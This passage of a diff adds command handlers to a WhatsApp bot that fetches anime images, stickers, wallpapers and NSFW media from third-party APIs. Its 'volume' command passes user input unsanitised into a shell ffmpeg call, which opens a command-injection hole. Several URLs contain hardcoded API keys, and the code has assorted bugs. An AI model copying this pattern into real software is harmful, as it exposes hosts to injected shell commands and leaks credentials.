+jpegThumbnail: thum,
+caption: teks,
+footer: `${global.botname}`,
+buttons: buttons,
+headerType: 4
+}
+XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+})
+}
+break
+            case 'wattpad': {
+            if (!text) return m.reply(`Example : ${prefix + command} love`)
+            let res = await fetchJson(`https://zenzapis.xyz/webzone/wattpad?query=$text}&apikey=hdiiofficial`)
+            let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
+            let capt = `Wattpad From query\n\n`
+            capt += ` Title: ${judul}\n`
+            capt += ` Read: ${dibaca}\n`
+            capt += ` Vote: ${divote}\n`
+            capt += ` Chapter: ${bab}\n`
+            capt += ` Url: ${url}\n`
+            capt += ` Description: ${description}`
+            XeonBotInc.sendImage(m.chat, thumb, capt, m)
+            }
+            break
+case 'mcserver': case 'mcquery': {
+if (!args.join(" ")) return m.reply(`Example : \n${prefix + command} ip|port\nUses : \n${prefix + command} play.xeon.com|19132`)
+const Query = require("minecraft-query");
+const qury = args.join(" ")
+const iphost = qury.split("|")[0];
+const portnya = qury.split("|")[1];
+if (!iphost) return m.reply(`Where's your ip?`)
+if (!portnya) return m.reply(`Where's the port??`)
+const q = new Query({host: iphost, port: portnya, timeout: 7500});
+q.fullStat()
+.then(success => {
+m.reply(jsonformat(success));
+return q.basicStat()
+})
+.then(success => {
+m.reply(jsonformat(success));
+q.close();
+})
+}
+break
+case 'swm2': case 'take2': case 'stickerwm2': {
+if (!args.join(" ")) return m.reply(`Example :\nswm ${global.author}|${global.packname}`)
+const swn = args.join(" ")
+const pcknm = swn.split("|")[0];
+const atnm = swn.split("|")[1];
+if (m.quoted.isAnimated === true) {
+XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
+XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
+} else if (/image/.test(mime)) {
+let media = await quoted.download()
+let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: global.atnm })
+await fs.unlinkSync(encmedia)
+} else if (/video/.test(mime)) {
+if ((quoted.msg || quoted).seconds > 11) return m.reply('Maximum 10 seconds!')
+let media = await quoted.download()
+let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
+await fs.unlinkSync(encmedia)
+} else {
+m.reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
+}
+}
+break
+case 'smeme': case 'stickermeme': case 'stickmeme': {
+let { TelegraPh } = require('./lib/uploader')
+if (!text) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
+if (text.includes('|')) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
+if (!/image/.test(mime)) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
+m.reply(mess.wait)
+mee = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+mem = await TelegraPh(mee)
+meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
+memek = await XeonBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
+await fs.unlinkSync(memek)
+}
+break
+case 'emoji': {
+if (!args.join(" ")) return m.reply('Where is the emoji?')
+emoji.get(args.join(" ")).then(async(emoji) => {
+let mese = await XeonBotInc.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
+await XeonBotInc.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
+})
+}
+break
+case 'volume': {
+if (!args.join(" ")) return m.reply(`Example: ${prefix + command} 10`)
+media = await XeonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
+if (isQuotedAudio) {
+rname = getRandom('.mp3')
+exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
+fs.unlinkSync(media)
+if (err) return m.reply('Error!')
+jadie = fs.readFileSync(rname)
+XeonBotInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
+fs.unlinkSync(rname)
+})
+} else if (isQuotedVideo) {
+rname = getRandom('.mp4')
+exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
+fs.unlinkSync(media)
+if (err) return m.reply('Error!')
+jadie = fs.readFileSync(rname)
+XeonBotInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
+fs.unlinkSync(rname)
+})
+} else {
+m.reply("Send video/audio")
+}
+}
+break
+case 'triggeredwebp': case 'wanted': {
+	            if (!/image/.test(mime)) return m.reply(`*Send/Reply Image With Caption* ${prefix + command}`)
+	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader3')
+                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)                
+                let anu = await TelegraPh(media)
+                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/${command}?url=${anu}`)
+                XeonBotInc.sendMessage(m.chat, { image: buf, caption: `Made by ${botname}` }, { quoted: m}).catch ((err) => m.reply(mess.error))
+                }
+                break
+case 'woof':
+case '8ball':
+case 'goose':
+case 'gecg':
+case 'feed':
+case 'avatar':
+case 'lizard':
+case 'meow':
+case 'tickle':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonssMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonssMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'wallneon': case 'wallrandom': case 'wallcode': case 'wallpubg': case 'wallml': 	
+try{
+m.reply(mess.wait)						
+nyz2 = await fetchJson(`https://myselfff.herokuapp.com/docs/wallpaper/${command}`) 
+nyz3 = await getBuffer(nyz2.list.gambar)
+XeonBotInc.sendMessage(from, {image : nyz3, caption:`By ${global.botname}`}, {quoted:m}) 						
+} catch (e) {
+m.error("Error!")
+}
+break
+case 'wallpaper': case 'animewallpaper': case 'animewall': {
+                if (!args.join(" ")) return m.reply("What picture are you looking for??")
+		let { wallpaper } = require('./lib/scraperW')
+                anu = await wallpaper(args)
+                result = anu[Math.floor(Math.random() * anu.length)]
+		let buttons = [
+                    {buttonId: `.wallpaper ${args.join(" ")}`, buttonText: {displayText: 'Next Image'}, type: 1}
+                ]
+                let buttonMessage = {
+                    image: { url: result.image[0] },
+                    caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`,
+                    footer: `${botname}`,
+                    buttons: buttons,
+                    headerType: 4
+                }
+                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+            }
+            break
+case 'animewall2': case 'animewallpaper2':
+m.reply(mess.wait)						
+const { AnimeWallpaper } =require("anime-wallpaper")
+if(!q) return m.reply('What wallpaper do you want?')
+const wall = new AnimeWallpaper();
+    const pages = [1,2,3,4];
+        const random=pages[Math.floor(Math.random() * pages.length)]
+        const wallpaper = await wall
+            .getAnimeWall4({ title: q, type: "sfw", page: pages })
+            .catch(() => null);
+const i = Math.floor(Math.random() * wallpaper.length);
+var walb = [
+        {buttonId: `.${command} ${q}`, buttonText: {displayText: `Next 😼`}, type: 1},        
+        ]
+      let wal = {
+       image: {url:wallpaper[i].image},
+       caption: `*Query :* ${q}`,
+      footer: `${global.botname}`,
+      buttons: walb,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, wal,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+//XeonBotInc.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
+break
+case 'igemoji': 
+case 'instagramemoji': 
+if (!q) return m.reply("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "11")
+break
+case 'iphoneemoji': 
+if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "0")
+break
+case 'googleemoji': 
+if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "1")
+break
+case 'samsungemoji': 
+if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "2")
+break
+case 'microsoftemoji': 
+if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "3")
+break
+case 'whatsappemoji': 
+if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "4")
+break
+case 'twitteremoji': 
+if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "5")
+break
+case 'facebookemoji': 
+case 'fbemoji': 
+if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "6")
+break
+case 'skypeemoji': 
+if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "7")
+break
+case 'joyemoji': 
+if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "8")
+break
+case 'mojiemoji': 
+if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "9")
+case 'pediaemoji': 
+if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 🔖˜€`)
+m.reply(mess.wait)
+emote(q, "10")
+break
+
+case 'asuna':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://revita.herokuapp.com/api/wallpaper/asuna?apikey=ApiRevita`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+case 'anna':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://api.zeeoneofc.xyz/api/anime/anna?apikey=5Cd8U3tG`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+case 'chitoge':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://revita.herokuapp.com/api/wallpaper/chitoge?apikey=ApiRevita`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+case 'cosplay':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://kannxapi.herokuapp.com/api/randomimage/cosplay`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+case 'elaina':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://revita.herokuapp.com/api/wallpaper/elaina?apikey=ApiRevita`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+case 'emilia':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://revita.herokuapp.com/api/wallpaper/emilia?apikey=ApiRevita`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+case 'gremory':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://revita.herokuapp.com/api/wallpaper/gremory?apikey=ApiRevita`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+case 'kaguya':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://revita.herokuapp.com/api/wallpaper/shinomiya?apikey=ApiRevita`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+case 'kotori':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://revita.herokuapp.com/api/wallpaper/kotori?apikey=ApiRevita`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+case 'kurumi':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://revita.herokuapp.com/api/wallpaper/kurumi?apikey=ApiRevita`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+case 'mikasa':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://revita.herokuapp.com/api/wallpaper/mikasa?apikey=ApiRevita`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+
+case 'rize':
+m.reply(mess.wait)						
+teks = `Here you go! 🏃🏻‍♂️`
+buffer = `https://revita.herokuapp.com/api/wallpaper/rize?apikey=ApiRevita`
+XeonBotInc.sendMessage(from, {image:{url:buffer}, caption:"Here you go! 🏃🏻‍♂️"}, {quoted:m})
+break
+case 'cry':case 'kill':case 'hug':case 'pat':case 'lick':case 'kiss':case 'bite':case 'yeet':case 'neko':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':
+					axios.get(`https://api.waifu.pics/sfw/${command}`)
+					.then(({data}) => {
+						XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
+					})
+					break
+case 'loli-waifu':
+					m.reply(mess.wait)
+					axios.get(`https://api.waifu.pics/sfw/waifu`)
+					.then(({data}) => {
+					XeonBotInc.sendImage(m.chat, data.url, mess.success, m)
+					})
+					break
+case 'naruto':
+				m.reply(mess.wait)
+			    var query = ["naruto hd","naruto boruto","naruto sasuke", "naruto aesthetic", "naruto aesthetic"]
+                var data = await pinterest(pickRandom(query))
+				var but = [{buttonId: `naruto`, buttonText: { displayText: "Next🔖ž¡ï¸" }, type: 1 }]
+				XeonBotInc.sendMessage(from, { caption: `Here you go! 🏃🏻‍♂️`, image: { url: pickRandom(data.result) }, buttons: but, footer: `${botname}` }, { quoted: m })
+ 			    break
+case 'yaoi':
+				m.reply(mess.wait)
+			    var query = ["yaoi","yaoi aesthetic","yaoi hd","yaoi ganteng"]
+                var data = await pinterest(pickRandom(query))
+				var but = [{buttonId: `${command}`, buttonText: { displayText: "Next🔖ž¡ï¸" }, type: 1 }]
+				XeonBotInc.sendMessage(from, { caption: "Here you go! 🏃🏻‍♂️", image: { url: pickRandom(data.result) }, buttons: but, footer: `${botname}` }, { quoted: m })
+ 			    break
+case 'hentaivid': case 'hentaivideo': {
+	if (!m.isGroup) return m.reply(mess.group)
+if (!AntiNsfw) return m.reply(mess.nsfw)
+                m.reply(mess.wait)
+                const { hentai } = require('./lib/scraper.js')
+                anu = await hentai()
+                result912 = anu[Math.floor(Math.random(), anu.length)]
+                XeonBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
+            }
+            break
+case 'trap' :
+if (!m.isGroup) return m.reply(mess.group)
+if (!AntiNsfw) return m.reply(mess.nsfw)
+m.reply(mess.wait)
+ waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
+ let trapbot = [
+    {buttonId: `trap`, buttonText: {displayText: `Next 🔖š¡`}, type: 1},
+    ]
+  let button2Messages = {
+   image: {url:waifudd.data.url},
+   caption:  `Here you go! 🏃🏻‍♂️`,
+  buttons: trapbot,
+  headerType: 1
+  }     
+            await XeonBotInc.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'hentai-neko' :
+case 'hneko' :
+if (!m.isGroup) return m.reply(mess.group)
+if (!AntiNsfw) return m.reply(mess.nsfw)
+    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
+ let hnekobot = [
+    {buttonId: `.hneko`, buttonText: {displayText: `Next 🔖š¡`}, type: 1},
+    ]
+  let button3Messages = {
+   image: {url:waifudd.data.url},
+   caption:  `Here you go! 🏃🏻‍♂️`,
+  buttons: hnekobot,
+  headerType: 1
+  }      
+            await XeonBotInc.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'hentai-waifu' :
+case 'nwaifu' :
+if (!m.isGroup) return m.reply(mess.group)
+if (!AntiNsfw) return m.reply(mess.nsfw)
+m.reply(mess.wait)
+    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
+ let nwaifubot = [
+    {buttonId: `.hneko`, buttonText: {displayText: `Next 🔖š¡`}, type: 1},
+    ]
+  let button4Messages = {
+   image: {url:waifudd.data.url},
+   caption:  `Here you go! 🏃🏻‍♂️`,
+  buttons: nwaifubot,
+  headerType: 1
+  }      
+            await XeonBotInc.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'gasm':
+if (!m.isGroup) return m.reply(mess.group)
+	if (!AntiNsfw) return m.reply(mess.nsfw)
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonsssMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break   
+case 'animesmug':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/smug`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let button1ssMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, button1ssMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'foxgirl':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let button12ssMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, button12ssMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break   
+case 'animenom' :
+m.reply(mess.wait)
+    waifudd = await axios.get(`https://waifu.pics/api/sfw/nom`)
+ let xxhnekobot = [
+    {buttonId: `.nom`, buttonText: {displayText: `Next 🔖š¡`}, type: 1},
+    ]
+  let xx1button3Messages = {
+   image: {url:waifudd.data.url},
+   caption:  `Here you go! 🏃🏻‍♂️`,
+  buttons: xxhnekobot,
+  headerType: 1
+  }      
+            await XeonBotInc.sendMessage(m.chat, xx1button3Messages, { quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animewaifu':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let button112ssMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, button112ssMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animeneko':
+m.reply(mess.wait)						
+   waifud = await axios.get('https://waifu.pics/api/sfw/neko')
+                var wbutsss = [
+        {buttonId: `.neko`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonssMessage = {
+       image: {url:waifud.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbutsss,
+      headerType: 4
+      }
+            await XeonBotInc.sendMessage(m.chat,buttonssMessage, { quoted:m }).catch(err => {
+                    return('Error!')
+                })               
+                break
+case 'animecuddle':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonsosMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonsosMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break   
+case 'animeslap':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let btutttonssMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, btutttonssMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animepat':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let xxbuttonssMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, xxbuttonssMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animeneko':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/neko`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonsTsMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonsTsMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animehug':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonussMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonussMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animekiss':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let bxxuttonssMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, bxxuttonssMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animewlp':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttoxnssMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttoxnssMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animespank':
+if (!m.isGroup) return m.reply(mess.group)
+if (!AntiNsfw) return m.reply(mess.nsfw)
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)
+                           var wbuttsss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonssxMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttsss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonssxMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animecry':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/cry`)
+                           var wbutt1sss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let button1ssxMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbutt1sss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, button1ssxMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animekill':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/kill`)
+                           var wbuttszzss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsxMessages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszzss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsxMessages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animelick':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/lick`)
+                           var wbuttszz12ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx12Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz12ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx12Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animebite':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/bite`)
+                           var wbuttszz123ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx123Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz123ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx123Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animeyeet':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/yeet`)
+                           var wbuttszz124ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx124Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz124ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx124Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animebully':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/lick`)
+                           var wbuttszz125ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx125Messages = {
+       image: {url:waifudd.data.url},
+       caption:  `Here you go! 🏃🏻‍♂️`,
+      footer: `${global.botname}`,
+      buttons: wbuttszz125ss,
+      headerType: 4
+      }     
+            await XeonBotInc.sendMessage(m.chat, buttonszzsx125Messages,{ quoted:m }).catch(err => {
+                    return('Error!')
+                })
+break
+case 'animebonk':
+m.reply(mess.wait)						
+ waifudd = await axios.get(`https://api.waifu.pics/sfw/bonk`)
+                           var wbuttszz126ss = [
+        {buttonId: `.${command}`, buttonText: {displayText: `Next 😼`}, type: 1},
+        ]
+      let buttonszzsx126Messages = {
+       image: {url:waifudd.data.url},
